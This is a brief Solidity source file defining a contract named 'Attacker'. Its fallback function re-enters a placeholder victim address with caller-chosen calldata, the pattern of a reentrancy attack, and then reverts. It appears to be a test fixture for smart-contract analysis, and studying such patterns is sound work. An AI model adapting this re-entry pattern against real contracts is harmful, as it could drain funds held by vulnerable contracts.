pragma solidity ^0.4.2;

contract Attacker {    
  bytes data = "";
  uint count = 0;
  address victim = 0xf1;

  function() payable {
    count ++;
    if (count < 2) {
      address(victim).call(data);
    }
    count = 0;
    data = "";
    revert();
  }

  function set(bytes _data) {
    data = _data;
  }
}
